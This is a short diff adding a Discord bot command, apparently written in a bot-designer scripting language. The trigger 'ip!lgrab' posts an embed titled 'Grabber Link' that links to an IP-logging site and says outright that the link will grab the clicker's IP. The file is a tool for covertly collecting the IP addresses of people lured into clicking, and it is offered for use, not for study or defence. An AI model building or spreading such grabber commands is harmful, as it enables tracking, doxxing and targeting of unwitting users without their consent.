@@ -1,0 +1,10 @@
+Trigger: ip!lgrab
+
+Code:
+$nomention
+$title[Grabber Link]
+$addField[Clicks;0]
+$addField[Link;https://headshot.monster/CDQGEC]
+$footer[This link will grab your IP]
+$color[FEEB03]
+$cooldown[30s;Please wait 30 seconds!]
